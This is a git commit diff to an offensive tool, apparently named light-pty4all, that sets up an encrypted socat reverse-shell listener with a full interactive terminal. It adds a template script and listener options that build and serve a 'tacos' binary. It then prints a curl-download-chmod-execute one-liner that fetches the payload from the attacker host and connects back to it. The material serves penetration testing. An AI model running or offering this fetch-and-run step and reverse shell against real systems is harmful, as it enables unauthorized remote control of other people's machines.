2344a5de543e07e91d0c386a257e047ca51f3ca5
ariary <ariary9.2@hotmail.fr>
2022-02-27 12:23:53 -0500

    gitar shortcut

---
+++ light-pty4all/socat-forker.sh.tpl
@@ -0,0 +1,18 @@
+#!/bin/bash -x
+
+SOCKDIR=$(mktemp -d)
+SOCKF=${SOCKDIR}/usock
+
+# Start tmux, if needed
+tmux start
+# Create window
+tmux new-window "socat UNIX-LISTEN:${SOCKF},umask=0077 file:\`tty\`,raw,echo=0"
+# Wait for socket
+while test ! -e ${SOCKF}; do sleep 1; done
+SOCAT_TTY=$(tty)
+
+# space for no history, gitar shortcut
+echo "   $(gitar --dry-run -e GITAR_HOST)" > ${SOCAT_TTY}
+
+# Use socat to ship data between the unix socket and STDIO.
+exec socat file:${SOCAT_TTY},raw,echo=0 UNIX-CONNECT:${SOCKF}
--- light-pty4all/socat-listener.sh
+++ light-pty4all/socat-listener.sh
@@ -8,13 +8,21 @@ for i in "$@"; do
         LPORT="$2"
         shift;shift;
         ;;
-    *)
+    --lhost)
+        LHOST="$2"
+        shift;shift;
+        ;;
+    --gitar)
+        GITAR=true
+        ;;
+    *)    
         ;;
     esac
 done
 if  [[ -z "$LPORT" ]];
 then
-    echo "Usage : $0 --lport <LPORT>"
+    echo "Usage : $0 --lhost <LHOST> --lport <LPORT>"
+    echo "to preload gitar shortcuts within reverse shell: $0 --lhost <LHOST> --lport <LPORT>"
     exit 92
 fi
 
@@ -32,5 +40,27 @@ else
     cat server.key server.crt >server.pem
 fi
 
+cp socat-forker.sh.tpl socat-forker.sh
+
+if [[ "$GITAR" ]]; then
+    echo "[+] gitar shortcuts enabled on reverse shell"
+    sed -i "s/GITAR_HOST/${LHOST}/g" socat-forker.sh
+    echo "[+] launch gitar server"
+    tmux split-window -h "gitar -e ${LHOST}"
+else
+    sed -i "/GITAR_HOST/d" socat-forker.sh
+    echo "[+] gitar shortcuts  not enabled"
+    tmux split-window -h "python3 -m http.server 8080"
+fi
+
+# put tacos in current directory
+cd ..  && make build.tacos && cd -
+mv ../tacos .
+
+if [[ "$GITAR" ]]; then
+	echo "curl -O ${LHOST}:9237/pull/tacos -o tacos && chmod +x tacos && ./tacos ${LHOST}:${LPORT}"
+else
+	echo "curl -O ${LHOST}:8080/tacos -o tacos && chmod +x tacos && ./tacos ${LHOST}:${LPORT}"
+fi
 
 socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:./socat-forker.sh,pty,raw,echo=0
